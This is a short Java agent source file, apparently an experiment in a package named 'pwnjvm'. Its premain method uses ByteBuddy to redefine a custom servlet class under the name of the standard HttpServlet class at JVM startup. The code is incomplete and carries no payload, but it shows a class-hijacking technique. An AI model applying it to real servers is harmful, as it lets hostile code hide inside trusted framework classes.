package test.pwnjvm;

import java.lang.instrument.Instrumentation;
import net.bytebuddy.ByteBuddy;
import net.bytebuddy.dynamic.loading.ClassReloadingStrategy;
//import net.bytebuddy.agent.ByteBuddyAgent;


public class Agent {
	public Agent() {}
	//是在agent中，将自己的类编程attach到jvm的父类，或者说子类
	public static void premain(String arg, Instrumentation instrumentation){
		System.out.println("--Method premain() gots executed at this position--");
		//ByteBuddyAgent.install();
		MyServlet foo = new MyServlet();
		new ByteBuddy()
		  .redefine(MyServlet.class)
		  .name(javax.servlet.http.HttpServlet.class.getName())
		  .make()
		  .load(MyServlet.class.getClassLoader(), ClassReloadingStrategy.fromInstalledAgent())
		  .getLoaded();
	}
	
	
	public static void premain(String arg){
		
	}
}

	
	
	
